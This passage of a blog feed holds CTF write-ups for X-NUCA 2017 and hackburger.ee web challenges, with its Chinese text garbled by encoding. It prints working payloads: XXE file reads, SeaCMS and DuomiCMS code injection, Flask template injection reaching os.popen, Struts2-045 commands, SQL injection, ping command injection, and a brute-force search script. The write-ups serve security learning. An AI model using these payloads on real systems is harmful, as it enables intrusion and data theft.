<h2 id="No-2-è®©ä½ æ— è¯­çš„md5"><a href="#No-2-è®©ä½ æ— è¯­çš„md5" class="headerlink" title="#No.2 è®©ä½ æ— è¯­çš„md5"></a>#No.2 è®©ä½ æ— è¯­çš„md5</h2><p>è¾“å…¥adminæç¤ºéæ³•ï¼Œè¾“å…¥adminåŠ ä¸€ä¸ªç©ºæ ¼æ‹¿åˆ°ä¸€ä¸ªmd5ï¼Œè§£å¯†å¾—åˆ°flag</p>
<h2 id="No-3-Pav1å’Œlloowweerrâ€¦"><a href="#No-3-Pav1å’Œlloowweerrâ€¦" class="headerlink" title="#No.3 Pav1å’Œlloowweerrâ€¦"></a>#No.3 Pav1å’Œlloowweerrâ€¦</h2><p><code>FFmpegä»»æ„æ–‡ä»¶è¯»å–</code>æ¼æ´ï¼Œæ„é€ è¯»å–flagæ–‡ä»¶çš„aviï¼Œä¸Šä¼ åä¸‹è½½æ‰“å¼€å¾—åˆ°flag<br>å‚è€ƒé“¾æ¥ï¼š<a href="http://www.freebuf.com/vuls/138377.html" target="_blank" rel="noopener">http://www.freebuf.com/vuls/138377.html</a></p>
<h2 id="No-4-X-NUCA-2017â€™s-Sâ€¦"><a href="#No-4-X-NUCA-2017â€™s-Sâ€¦" class="headerlink" title="#No.4 X-NUCA 2017â€™s Sâ€¦"></a>#No.4 X-NUCA 2017â€™s Sâ€¦</h2><p>æ²¡åšå‡ºæ¥<br>ROIS WriteUp:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">/res/site.war ä¸‹è½½æºç  zip è§£å‹ jd-gui çœ‹ class</div><div class="line">æ³¨å†Œçš„æ—¶å€™åŠ ä¸€ä¸ª isActive=1 å°±èƒ½ç™»å½•</div><div class="line">ç„¶åç°åœ¨æ˜¯è¦è®© isSupaAdministrata=1</div><div class="line">å‚è€ƒ http://blog.csdn.net/qq_27446553/article/details/73480823 å¯¹è±¡è‡ªåŠ¨ç»‘å®š</div><div class="line">æ‹¿åˆ°http://a4b359466421ae3aa76a8b116dda3870.xnuca.cn/res/HYGorlL29LtcMCR6GUg23XRM</div><div class="line">JxVge5F7.js</div></pre></td></tr></table></figure></p>
<h2 id="No-5-Lucky-Number-Caâ€¦"><a href="#No-5-Lucky-Number-Caâ€¦" class="headerlink" title="#No.5 Lucky Number Caâ€¦"></a>#No.5 Lucky Number Caâ€¦</h2><p><code>Xxe</code>ï¼Œæ„é€ postå†…å®¹å¦‚ä¸‹ï¼Œä½†æ˜¯æ­»éƒ½æ‰¾ä¸åˆ°flagï¼Œèµ›åå¬è¯´åœ¨/etc/hostsï¼Œæ„Ÿè§‰è¿™ç§è—ç€æ–ç€flagçš„é¢˜å¾ˆæ²¡æ„æ€<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE xdsec[</span></div><div class="line"><span class="meta">&lt;!ELEMENT methodname ANY&gt;</span></div><div class="line"><span class="meta">&lt;!ENTITY file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/hosts"&gt;]&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">name</span>&gt;</span>&amp;file;<span class="tag">&lt;/<span class="name">name</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></div></pre></td></tr></table></figure></p>
<h2 id="No-6-Hello-World"><a href="#No-6-Hello-World" class="headerlink" title="#No.6 Hello World"></a>#No.6 Hello World</h2><p>çœ‹æç¤ºç›´æ¥fuzzåˆ°.gitç›®å½•ï¼Œä¸‹è½½ä¸‹æ¥åå¯ä»¥çœ‹åˆ°ä»£ç ã€‚<br>æœ‰ä¸ª<code>flag.php</code> å’Œ<code>flag.js</code>ï¼Œflag.phpæç¤ºflag not here<br>çŒœæµ‹ç”¨äº†gitçš„ä¿®æ”¹è®°å½•éšè—æ•°æ®ï¼Œåœ¨æ—¥å¿—ä¸­çœ‹ä¸åˆ°å…¶ä»–çš„ä¿®æ”¹æ—¥å¿—<br>å¯ä»¥ç”¨<code>æ˜¾ç¤ºå¼•ç”¨è®°å½•</code>çš„æ–¹å¼æŸ¥çœ‹ã€‚<br>ç„¶ååˆæ‰¾åˆ°ä¸€ä¸ªflag.jsæ¯”è¾ƒä¸¤ä¸ªflag.jså¾—åˆ°<code>flag{82efc37f1cd5d4636ea7cadcd5a814a2}</code></p>
<h2 id="No-7-xblog"><a href="#No-7-xblog" class="headerlink" title="#No.7 xblog"></a>#No.7 xblog</h2><p>æœ‰æºç æ³„éœ²ï¼Œä½†æ˜¯æ²¡åšå‡ºæ¥</p>
<h2 id="No-8-çœ‹è§†é¢‘çœŸå—¨çš®"><a href="#No-8-çœ‹è§†é¢‘çœŸå—¨çš®" class="headerlink" title="#No.8 çœ‹è§†é¢‘çœŸå—¨çš®"></a>#No.8 çœ‹è§†é¢‘çœŸå—¨çš®</h2><p><code>æµ·æ´‹cms</code><br>æ‰¾åˆ°<code>exp</code>æ„é€ <code>post</code>æ•°æ®å³å¯<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://567252405122515e0ed912af9b26d404.xnuca.cn/search.php?searchtype=5</div></pre></td></tr></table></figure></p>
<p>postæ•°æ®ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">searchword=d&amp;order=&#125;&#123;endif&#125;&#123;if:1)eval($_POST[x]);if(1&#125;&#123;end if&#125;&amp;x=$TxtRes=file_put_contents(&quot;writeHere/da6afcecd8a4915e67964700d2008d29&quot;, &quot;test&quot;);echo 666;</div></pre></td></tr></table></figure></p>
<p>å‚è€ƒé“¾æ¥ï¼š<a href="http://www.bugku.com/forum.php?mod=viewthread&amp;tid=28" target="_blank" rel="noopener">http://www.bugku.com/forum.php?mod=viewthread&amp;tid=28</a></p>
<h2 id="No-9-The-Best-Communâ€¦"><a href="#No-9-The-Best-Communâ€¦" class="headerlink" title="#No.9 The Best Communâ€¦"></a>#No.9 The Best Communâ€¦</h2><p><code>Dolphin</code><br>ç›´æ¥expæ‰“ï¼Œæœ¬æ¥å°±æƒ³éšä¾¿è¯•ä¸€è¯•ç»“æœç›´æ¥è¿›åˆ°ä¸€ä¸ªå‘½ä»¤è¡Œæ¨¡å¼ï¼Œå°±æ˜¯æˆåŠŸäº†ï¼Œè¾“å…¥system();å‘½ä»¤æ‹¿flag<br>å‚è€ƒé“¾æ¥ï¼š<a href="https://www.seebug.org/vuldb/ssvid-92546" target="_blank" rel="noopener">https://www.seebug.org/vuldb/ssvid-92546</a></p>
<h2 id="No-10-ä¹°ä¹°ä¹°ï¼"><a href="#No-10-ä¹°ä¹°ä¹°ï¼" class="headerlink" title="#No.10 ä¹°ä¹°ä¹°ï¼"></a>#No.10 ä¹°ä¹°ä¹°ï¼</h2><p>æ²¡åš</p>
<h2 id="No-11-ä¸¤åªå°èœœèœ‚å•Š"><a href="#No-11-ä¸¤åªå°èœœèœ‚å•Š" class="headerlink" title="#No.11 ä¸¤åªå°èœœèœ‚å•Š"></a>#No.11 ä¸¤åªå°èœœèœ‚å•Š</h2><p><code>Beescms</code><br>è·Ÿç€expèµ°ï¼Œå…ˆæ‹¿åå°æƒé™åœ¨ä¸Šä¼ shell<br>å‚è€ƒé“¾æ¥ï¼š<a href="https://bbs.ichunqiu.com/thread-13977-1-1.html?from=jike" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-13977-1-1.html?from=jike</a></p>
<h2 id="No-12-ç¤¾å·¥åº“"><a href="#No-12-ç¤¾å·¥åº“" class="headerlink" title="#No.12 ç¤¾å·¥åº“"></a>#No.12 ç¤¾å·¥åº“</h2><p>æ²¡åš</p>
<h2 id="No-13-ç¨‹åºå‘˜æ€ä¹ˆèƒ½ä¸çŸ¥é“Jenkinâ€¦"><a href="#No-13-ç¨‹åºå‘˜æ€ä¹ˆèƒ½ä¸çŸ¥é“Jenkinâ€¦" class="headerlink" title="#No.13 ç¨‹åºå‘˜æ€ä¹ˆèƒ½ä¸çŸ¥é“Jenkinâ€¦"></a>#No.13 ç¨‹åºå‘˜æ€ä¹ˆèƒ½ä¸çŸ¥é“Jenkinâ€¦</h2><p><code>Jenkins</code><br>æ‰¾åˆ°äº†expä½†æ˜¯æ²¡æ‰“æˆåŠŸ</p>
<h2 id="No-14-è¯•ä¸€è¯•"><a href="#No-14-è¯•ä¸€è¯•" class="headerlink" title="#No.14 è¯•ä¸€è¯•"></a>#No.14 è¯•ä¸€è¯•</h2><p><code>å¤šç±³cms</code>ï¼Œæœ‰ä¸ªé€šç”¨æ³¨å…¥æ¼æ´ï¼Œä½†æ˜¯å¥½åƒåŠ äº†wafï¼Œæ²¡æœ‰èŠ±æ—¶é—´å»ç»•è¿‡ï¼Œæ²¡åšå‡ºæ¥<br>ROISçš„payloadï¼š<code>search.php?jq=1);system(dir);//&amp;searchtype=5</code></p>
<h2 id="No-15-çŒœä¸€çŒœ"><a href="#No-15-çŒœä¸€çŒœ" class="headerlink" title="#No.15 çŒœä¸€çŒœ"></a>#No.15 çŒœä¸€çŒœ</h2><p><code>Joomla</code></p>
<p>æ²¡åšå‡ºæ¥</p>
<h2 id="No-16-æ¥ä¸€å‘flask"><a href="#No-16-æ¥ä¸€å‘flask" class="headerlink" title="#No.16 æ¥ä¸€å‘flask"></a>#No.16 æ¥ä¸€å‘flask</h2><p><code>Flask</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://062ed0f9233795319ceac93209b40860.xnuca.cn/invalid&#123;&#123; &apos;&apos;.__class__.__mro__[2].__subclasses__()[40](&apos;/etc/flag.txt&apos;).read() &#125;&#125;</div></pre></td></tr></table></figure></p>
<p>åªè¯»äº†flagï¼Œå†™çš„éƒ¨åˆ†æ²¡æœ‰æˆåŠŸ<br>å‚è€ƒé“¾æ¥ï¼š<a href="http://www.freebuf.com/articles/web/98928.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/98928.html</a><br>ROIS:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&#123;&#123; [].__class__.__base__.__subclasses__()[59].__init__.func_globals[&apos;linecache&apos;].__dict__[&apos;os&apos;].popen(&apos;id&apos;).read() &#125;&#125;</div></pre></td></tr></table></figure></p>
<h2 id="No-17-ç®€å•ç‚¹"><a href="#No-17-ç®€å•ç‚¹" class="headerlink" title="#No.17 ç®€å•ç‚¹"></a>#No.17 ç®€å•ç‚¹</h2><p><code>CMS Made Simpl CMS</code></p>
<p>æ²¡åšå‡ºæ¥</p>
<h2 id="No-18-â€œå¼€è®²å•¦â€"><a href="#No-18-â€œå¼€è®²å•¦â€" class="headerlink" title="#No.18 â€œå¼€è®²å•¦â€"></a>#No.18 â€œå¼€è®²å•¦â€</h2><p><code>Acontent</code>ï¼ŒæŸ¥åˆ°äº†cveä½†æ˜¯æ²¡åˆ©ç”¨æˆåŠŸ<br>Ph0en1x WriteUpï¼š<br><a href="https://chybeta.github.io/2017/08/26/XNUCA2017-%E7%AC%AC%E4%B8%80%E6%9C%9F%EF%BC%9AWeb-writeup/" target="_blank" rel="noopener">https://chybeta.github.io/2017/08/26/XNUCA2017-%E7%AC%AC%E4%B8%80%E6%9C%9F%EF%BC%9AWeb-writeup/</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">http://8d52640a73d8073066c951df0501184a.xnuca.cn/oauth/lti/common/tool_provider_outcome.php</div><div class="line">POST:</div><div class="line">grade=1&amp;key=1&amp;secret=secret&amp;sourcedid=1&amp;submit=Send%20Grade&amp;url=/etc/flag.txt</div></pre></td></tr></table></figure></p>
<h2 id="No-19-å†™ä¸ªç®€å†å§"><a href="#No-19-å†™ä¸ªç®€å†å§" class="headerlink" title="#No.19 å†™ä¸ªç®€å†å§"></a>#No.19 å†™ä¸ªç®€å†å§</h2><p>æ²¡åš</p>
<h2 id="No-20-SQLæ³¨å…¥"><a href="#No-20-SQLæ³¨å…¥" class="headerlink" title="#No.20 SQLæ³¨å…¥"></a>#No.20 SQLæ³¨å…¥</h2><p>ä¹Ÿæ˜¯<code>Joomla</code>ï¼Œæ²¡åš</p>
<h2 id="No-21-Freecms"><a href="#No-21-Freecms" class="headerlink" title="#No.21 Freecms"></a>#No.21 Freecms</h2><p><code>Freecms</code><br>Struts2-045ç›´æ¥æ‰“<code>http://cc7777fe6a8ce0d9544b623a0d2961fb.xnuca.cn/login_login.do</code><br><code>echo &quot;111&quot; &gt;/opt/apache-tomcat-8.0.44/webapps/ROOT/writeHere/da6afcecd8a4915e67964700d2008d29</code></p>
<h2 id="No-22-Phpcms-v9"><a href="#No-22-Phpcms-v9" class="headerlink" title="#No.22 Phpcms_v9"></a>#No.22 Phpcms_v9</h2><p><code>Phpcms9.6.3</code>ï¼Œæ²¡åšå‡ºæ¥ï¼Œè²Œä¼¼è¿˜åŠ äº†waf</p>
<h2 id="No-23-æ‰¾å…¥å£"><a href="#No-23-æ‰¾å…¥å£" class="headerlink" title="#No.23 æ‰¾å…¥å£"></a>#No.23 æ‰¾å…¥å£</h2><p><code>Wolfcms</code><br>admin admin è¿›åå°ï¼Œä¸Šä¼ phpæ‹¿åˆ°shell<br>å‚è€ƒé“¾æ¥ï¼š<a href="http://blog.csdn.net/hitwangpeng/article/details/45620701" target="_blank" rel="noopener">http://blog.csdn.net/hitwangpeng/article/details/45620701</a></p>
<h2 id="No-24-å¯çˆ±çš„æ˜Ÿæ˜Ÿ"><a href="#No-24-å¯çˆ±çš„æ˜Ÿæ˜Ÿ" class="headerlink" title="#No.24 å¯çˆ±çš„æ˜Ÿæ˜Ÿ"></a>#No.24 å¯çˆ±çš„æ˜Ÿæ˜Ÿ</h2><p><code>Sitestar å»ºç«™ä¹‹æ˜Ÿ</code>ï¼Œæ²¡æ‰¾åˆ°å¯ç”¨exp<br>ROIS:<br><figure class="highlight http"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">POST</span> <span class="string">/index.php?_a=do_mail&amp;_m=mod_email</span> HTTP/1.1</div><div class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded; charset=utf-8</div><div class="line"><span class="attribute">Cookie</span>: PHPSESSID=65676uue8hmaigepggn66pn1l6</div><div class="line"><span class="attribute">Host</span>: 522e52f9f4f81b75b2718ad29ac60c14.xnuca.cn</div><div class="line"><span class="attribute">Connection</span>: close</div><div class="line"><span class="attribute">User-Agent</span>: Paw/3.1.2 (Macintosh; OS X/10.12.6) GCDHTTPRequest</div><div class="line"><span class="attribute">Content-Length</span>: 112</div><div class="line">title=aa&amp;email_s=a&amp;email_m=a&amp;type=a&amp;users=aaaa%27%7Caaa&amp;role%5B%5D=abdc%7D%27+union+select+</div><div class="line"><span class="attribute">1%2Cuser%28%29%2C3%23</span></div></pre></td></tr></table></figure></p>
<p>æ³¨å…¥å¾—åˆ° <code>admin</code> å¯†ç  <code>1234!@#$</code><br>ç™»å½•ä¹‹åä¸Šä¼ å›¾ç‰‡ï¼Œæ–‡ä»¶ç®¡ç†ä¸­é‡å‘½åä¸º.php</p>
<h2 id="No-25-æ„‰å¿«çš„ç©è€å§"><a href="#No-25-æ„‰å¿«çš„ç©è€å§" class="headerlink" title="#No.25 æ„‰å¿«çš„ç©è€å§"></a>#No.25 æ„‰å¿«çš„ç©è€å§</h2><p><code>Metinfo cms</code><br>è·Ÿç€expï¼Œé‡ç½®adminå¯†ç ä¸º1234567ï¼Œè¿›åå°ä¸Šä¼ test.phpæ‰“åŒ…æˆçš„zipï¼Œtypeæ”¹æˆskinï¼Œç„¶åtemplates/test.phpå°±æ˜¯flag<br>å‚è€ƒé“¾æ¥ï¼š<a href="https://www.secpulse.com/archives/41084.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/41084.html</a></p>
<h2 id="No-26-æŒ‘æˆ˜è‡ªæˆ‘"><a href="#No-26-æŒ‘æˆ˜è‡ªæˆ‘" class="headerlink" title="#No.26 æŒ‘æˆ˜è‡ªæˆ‘"></a>#No.26 æŒ‘æˆ˜è‡ªæˆ‘</h2><p>æ²¡åš</p>
<h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="#æ€»ç»“"></a>#æ€»ç»“</h2><p>æ•´ä¸ªæ¯”èµ›éš¾åº¦ä¸­ç­‰ï¼ŒåŸºæœ¬éƒ½æ˜¯åœ¨æ‰¾ç°æˆexpï¼Œæˆ‘ä»¬é˜Ÿé™¤äº†MD5é‚£é¢˜å…¶ä»–éƒ½æ˜¯æˆ‘Açš„ï¼Œä¸­é—´ä¸€åº¦éœ¸å æ¦œä¸€ï¼Œä½†æ˜¯æœ€ç»ˆæ’åç¬¬ä¹ï¼Œè¦åæ€çš„è¿˜æ˜¯å¾ˆå¤šçš„ã€‚<br>æ”¾ä¸ªå›¾çºªå¿µæ›¾ç»çš„æ¦œä¸€ã€‚<br><img src="/img/2017xnuca1.jpg" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;No-1-ä½ å–œæ¬¢é¢œæ–‡å­—ä¹ˆ&quot;&gt;&lt;a href=&quot;#No-1-ä½ å–œæ¬¢é¢œæ–‡å­—ä¹ˆ&quot; class=&quot;headerlink&quot; title=&quot;#No.1 ä½ å–œæ¬¢é¢œæ–‡å­—ä¹ˆ&quot;&gt;&lt;/a&gt;#No.1 ä½ å–œæ¬¢é¢œæ–‡å­—ä¹ˆ&lt;/h2&gt;&lt;p&gt;é‡ç½®å¯†ç è¾“å…¥adminå’Œå–œæ¬¢å°±æ‹¿ä¸‹flagäº†&lt;br&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://www.codemonster.cn/tags/CTF/"/>
    
      <category term="WriteUp" scheme="https://www.codemonster.cn/tags/WriteUp/"/>
    
      <category term="CMS" scheme="https://www.codemonster.cn/tags/CMS/"/>
    
      <category term="EXP" scheme="https://www.codemonster.cn/tags/EXP/"/>
    
      <category term="getshell" scheme="https://www.codemonster.cn/tags/getshell/"/>
    
  </entry>
  
  <entry>
    <title>2017 hackburger.ee éƒ¨åˆ†é¢˜ WriteUp</title>
    <link href="https://www.codemonster.cn/2017/07/28/2017-hackburger-some-writeup/"/>
    <id>https://www.codemonster.cn/2017/07/28/2017-hackburger-some-writeup/</id>
    <published>2017-07-28T08:13:54.000Z</published>
    <updated>2018-05-04T07:47:50.011Z</updated>
    
    <content type="html"><![CDATA[<p>hackburger.eeä¸€å…±åªæœ‰10é“é¢˜ï¼Œä½†æ˜¯éƒ½éå¸¸æœ‰æ„æ€ï¼ŒèŠ±äº†äº›æ—¶é—´åšå‡ºäº†5é“ï¼Œè¿™é‡Œè®°å½•ä¸€ä¸‹ï¼Œåç»­åšå‡ºæ¥çš„ä¹Ÿä¼šæ›´æ–°ä¸Šæ¥<br><a id="more"></a></p>
<h2 id="Warmup"><a href="#Warmup" class="headerlink" title="Warmup"></a>Warmup</h2><p>A ping utility, to ping stuff, you know<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://burger.laboratorium.ee:8000/</div></pre></td></tr></table></figure></p>
<p>å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Œ%0aæ¢è¡Œåå°±å¯ä»¥æ‰§è¡Œä»»æ„å‘½ä»¤<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://burger.laboratorium.ee:8000/?host=127.0.0.1%0als</div></pre></td></tr></table></figure></p>
<p>ç„¶åcat flag.phpå³å¯æ‹¿åˆ°flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">The flag is f1b35744925a3f5946c542a1ee64267af8b93b06</div></pre></td></tr></table></figure></p>
<h2 id="File-search"><a href="#File-search" class="headerlink" title="File search"></a>File search</h2><p>Here you can search files<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://burger.laboratorium.ee:8004/</div></pre></td></tr></table></figure></p>
<p>fuzzä¸­å‘ç°è¿™é¢˜çš„æœç´¢æ¡†ä¼šæœç´¢åˆ°æ–‡ä»¶åæˆ–å†…å®¹åŒ…å«è¯¥å­—ç¬¦ä¸²çš„æ–‡ä»¶ï¼Œå¾ˆå¤šäººç”¨burpæ‰‹åŠ¨è·‘ï¼Œæˆ‘å°±ç”¨pyå†™äº†ä¸ªå°è„šæœ¬<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/python</span></div><div class="line"><span class="comment">#-*- coding: utf-8 -*-</span></div><div class="line"><span class="comment">#by:CodeMonster</span></div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> re</div><div class="line"></div><div class="line">r=requests.session()</div><div class="line">str=<span class="string">"abcdefhijklmnopqrstuvwxyz1234567890_g"</span></div><div class="line">ls=len(str)</div><div class="line">url=<span class="string">"http://burger.laboratorium.ee:8004/"</span></div><div class="line">flag=<span class="string">""</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">postq</span><span class="params">(s1)</span>:</span></div><div class="line">    data=&#123;<span class="string">"query"</span>:s1&#125;</div><div class="line">    r1=r.post(url=url,data=data)</div><div class="line">    <span class="keyword">return</span> len(re.findall( <span class="string">r'flag.txt'</span>, r1.text))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun1</span><span class="params">(s)</span>:</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> str:</div><div class="line">        flag=s+i</div><div class="line">        <span class="keyword">print</span> flag</div><div class="line">        <span class="keyword">if</span> postq(flag)==<span class="number">1</span>:</div><div class="line">            <span class="keyword">print</span> flag</div><div class="line">            flag=fun1(flag)</div><div class="line">            <span class="keyword">break</span></div><div class="line">    <span class="keyword">return</span> flag</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun2</span><span class="params">(s)</span>:</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> str:</div><div class="line">        flag=i+s</div><div class="line">        <span class="keyword">print</span> flag</div><div class="line">        <span class="keyword">if</span> postq(flag)==<span class="number">1</span>:</div><div class="line">            <span class="keyword">print</span> flag</div><div class="line">            flag=fun2(flag)</div><div class="line">            <span class="keyword">break</span></div><div class="line">    <span class="keyword">return</span> flag</div><div class="line"></div><div class="line"><span class="keyword">print</span> fun2(fun1(flag)[<span class="number">0</span>:<span class="number">-1</span>])[<span class="number">1</span>:]</div></pre></td></tr></table></figure></p>
<p>è¿™é‡ŒæŠŠgå­—ç¬¦æ”¾åˆ°äº†åé¢ï¼Œå› ä¸ºæ€•åŒ¹é…å‡ºflagå­—ç¬¦ä¸²ï¼Œæœ€åflagä¸º<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">t_h_e__f_l_a_g__i_s__c82584c307421228a3c5c5e4dc6a3ea31859975e</div></pre></td></tr></table></figure></p>
<h2 id="Number-to-ASCII-converter"><a href="#Number-to-ASCII-converter" class="headerlink" title="Number to ASCII converter"></a>Number to ASCII converter</h2><p>A tool to convert numbers to ASCII characters<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://burger.laboratorium.ee:8001/</div></pre></td></tr></table></figure></p>
<p>é¢˜ç›®ç»™äº†æºä»£ç ï¼Œå¾ˆå®¹æ˜“çœ‹å‡º<code>assert($_GET[&#39;number&#39;], &quot;Number is zero&quot;);</code>è¿™é‡Œå­˜åœ¨<code>å‘½ä»¤æ‰§è¡Œæ¼æ´</code><br>æ„é€ <br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://burger.laboratorium.ee:8001/?number=eval(system(&quot;cat where/is/the/flag/i/am/looking/for/flag.php&quot;))</div></pre></td></tr></table></figure></p>
<p>è¯»å–flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">The flag is adb92727cb7edc1802eb4616d23aef3ffaa928a4</div></pre></td></tr></table></figure></p>
<h2 id="Thatâ€™s-not-how-you-write-signup"><a href="#Thatâ€™s-not-how-you-write-signup" class="headerlink" title="Thatâ€™s not how you write signup"></a>Thatâ€™s not how you write signup</h2><p>A login form and a registration form. With some problems (but not SQL injection, SQLi is boring).<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://burger.laboratorium.ee:8002/</div></pre></td></tr></table></figure></p>
<p>é¢˜ç›®ç»™äº†ç™»å½•å’Œæ³¨å†ŒåŠŸèƒ½ï¼Œæºä»£ç ä¹Ÿç»™äº†ï¼Œæç¤ºä¸æ˜¯æ³¨å…¥ï¼Œåˆéœ€è¦adminç™»å½•ï¼Œå°±æƒ³åˆ°ä¸€ä¸ªå§¿åŠ¿ï¼Œmysqlå­—ç¬¦æˆªæ–­æ¼æ´,å› ä¸ºæ²¡æœ‰é™åˆ¶ç”¨æˆ·åé•¿åº¦ï¼Œå°±å¯ä»¥æ³¨å†Œä¸€ä¸ªç”¨æˆ·åä¸º<code>admin                         (...å¾ˆå¤šç©ºæ ¼...)111</code>çš„ç”¨æˆ·ï¼Œç„¶åå°±å¯ä»¥ç™»å½•adminè´¦å·</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Flag is ad0f46b77ae29d84a5f2b3a9b0784853d2aee093</div></pre></td></tr></table></figure>
<h2 id="Magic"><a href="#Magic" class="headerlink" title="Magic"></a>Magic</h2><p>The description left out intentionally. Flag3 is currently unavailable, enter 0 instead.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://burger.laboratorium.ee:8006/</div></pre></td></tr></table></figure></p>
<p>è€ƒå¯Ÿçš„æ˜¯æ‰«æå™¨ï¼Ÿï¼Ÿrobots.txtæœ‰ä¸ªflagï¼Œindex.php~æœ‰ä¸ªflagï¼Œ.gitæ³„éœ²ï¼Œç”¨githackçˆ¬ä¸‹æ¥index.phpé‡Œé¢æœ‰ä¸ªflagï¼Œæ‹¼æ¥èµ·æ¥å°±æ˜¯æœ€åçš„flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">47b9664515420d44d2c77dc593f7514ccbd17be8_392d28473a135c2491c227f373d0eed0310e13e3_0_ebb696a5abb04c8875a0afa29f6dc8d167db67e8</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;hackburger.eeä¸€å…±åªæœ‰10é“é¢˜ï¼Œä½†æ˜¯éƒ½éå¸¸æœ‰æ„æ€ï¼ŒèŠ±äº†äº›æ—¶é—´åšå‡ºäº†5é“ï¼Œè¿™é‡Œè®°å½•ä¸€ä¸‹ï¼Œåç»­åšå‡ºæ¥çš„ä¹Ÿä¼šæ›´æ–°ä¸Šæ¥&lt;br&gt;
    
    </summary>
    
    
      <category term="WriteUp" scheme="https://www.codemonster.cn/tags/WriteUp/"/>
    
      <category term="mysqlå­—ç¬¦æˆªæ–­" scheme="https://www.codemonster.cn/tags/mysql%E5%AD%97%E7%AC%A6%E6%88%AA%E6%96%AD/"/>
    
      <category term="php" scheme="https://www.codemonster.cn/tags/php/"/>
    
      <category term="python" scheme="https://www.codemonster.cn/tags/python/"/>
    
      <category term="RCE" scheme="https://www.codemonster.cn/tags/RCE/"/>
    
      <category term="å‘½ä»¤æ‰§è¡Œ" scheme="https://www.codemonster.cn/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
      <category term="æºç æ³„éœ²" scheme="https://www.codemonster.cn/tags/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/"/>
    
  </entry>
  
  <entry>
    <title>2017 XMANé€‰æ‹”èµ›WEBéƒ¨åˆ† WriteUp</title>
    <link href="https://www.codemonster.cn/2017/07/26/2017-xman-audition-web-writeup/"/>
    <id>https://www.codemonster.cn/2017/07/26/2017-xman-audition-web-writeup/</id>
    <published>2017-07-26T03:10:35.000Z</published>
    <updated>2018-05-04T07:47:50.013Z</updated>
    
